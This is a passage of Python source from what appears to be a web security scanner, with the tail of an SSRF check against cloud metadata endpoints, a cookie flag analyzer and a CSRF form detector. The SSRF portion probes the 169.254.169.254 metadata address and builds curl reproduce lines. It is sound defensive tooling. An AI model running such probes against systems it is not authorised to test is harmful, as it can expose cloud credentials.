                                "parameter":  param, "payload": target,
                                "indicator":  ind, "severity": "CRITICAL",
                                "url":        test_url,
                                "confidence": "HIGH", "verified": True,
                                "reproduce":  f"curl '{test_url}' | grep '{ind}'",
                                "remediation":"Validate and restrict URLs. Block RFC1918 + 169.254.169.254.",
                            })
                            break
                except Exception:
                    pass
        if not result["vulnerabilities"]:
            result["info"].append("No SSRF confirmed against cloud metadata endpoints.")
    except Exception as e:
        result["error"] = str(e)
    return result


def cookie_analyzer(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(),
              "cookies": [], "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        r = req.get(url, timeout=8, verify=False)
        for cookie in r.cookies:
            issues = []
            if not cookie.secure:
                issues.append("Secure flag missing")
            if not cookie.has_nonstandard_attr("HttpOnly"):
                issues.append("HttpOnly flag missing")
            samesite = cookie._rest.get("SameSite", "")
            if not samesite:
                issues.append("SameSite attribute missing")
            result["cookies"].append({
                "name": cookie.name,
                "secure": cookie.secure,
                "httponly": cookie.has_nonstandard_attr("HttpOnly"),
                "samesite": samesite or "Not set",
                "issues": issues,
            })
            for issue in issues:
                result["vulnerabilities"].append({
                    "type": f"Insecure Cookie: {issue}",
                    "cookie_name": cookie.name,
                    "severity": "HIGH" if "Secure" in issue else "MEDIUM",
                    "evidence": f"Cookie '{cookie.name}': {issue}",
                    "remediation": f"Set {issue.split()[0]} flag on cookie '{cookie.name}'.",
                })
        if not r.cookies:
            result["info"].append("No cookies found at this URL.")
    except Exception as e:
        result["error"] = str(e)
    return result


def csrf_check(url: str) -> dict:
    """CSRF check — only flag when actual <form> tags with state-changing methods exist.
    Skip pure SPAs and read-only pages (no forms = no CSRF surface)."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(),
              "info": {}, "vulnerabilities": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req, re as _re
        r = req.get(url, timeout=8, verify=False)
        content = r.text
        content_lower = content.lower()
        # Find actual form tags with their method attribute
        forms = _re.findall(r'<form\b[^>]*>', content, _re.IGNORECASE)
        state_changing_forms = [
            f for f in forms
            if _re.search(r'method\s*=\s*["\']?(post|put|delete|patch)', f, _re.IGNORECASE)
        ]
        # Also consider forms with no method attribute — default is GET, not state-changing
        # Only forms explicitly using POST/PUT/DELETE are CSRF-relevant

        csrf_tokens = ["csrf","_token","csrftoken","csrf_token","authenticity_token",
                       "requestverificationtoken","_csrf","xsrf","__requestverificationtoken"]
        found_token = any(tok in content_lower for tok in csrf_tokens)
        samesite_ok = any(c._rest.get("SameSite") in ("Strict","Lax") for c in r.cookies)
        # Check response headers for CSRF-related headers
        csrf_headers = any(h.lower() in ("x-csrf-token","x-xsrf-token") for h in r.headers)

        result["info"] = {
            "total_forms":            len(forms),
            "state_changing_forms":   len(state_changing_forms),
            "csrf_token_found":       found_token,
            "samesite_cookies":       samesite_ok,
            "csrf_headers":           csrf_headers,
        }

        if not state_changing_forms:
            result["info"]["note"] = "No POST/PUT/DELETE forms found — no CSRF surface on this page."
            return result

        if state_changing_forms and not found_token and not samesite_ok and not csrf_headers:
            result["vulnerabilities"].append({
                "type":       "Potential CSRF Vulnerability",
                "severity":   "HIGH",
                "evidence":   f"{len(state_changing_forms)} state-changing form(s), no CSRF token, no SameSite cookies, no CSRF headers",
                "confidence": "MEDIUM",
                "verified":   True,
                "reproduce":  f"View source of '{url}' and inspect <form method='POST'> elements",
                "remediation":"Implement synchroniser token pattern on all state-changing forms.",
            })
        else:
            result["info"]["note"] = "CSRF protections detected (token, SameSite, or custom header)."
    except Exception as e:
        result["error"] = str(e)
    return result
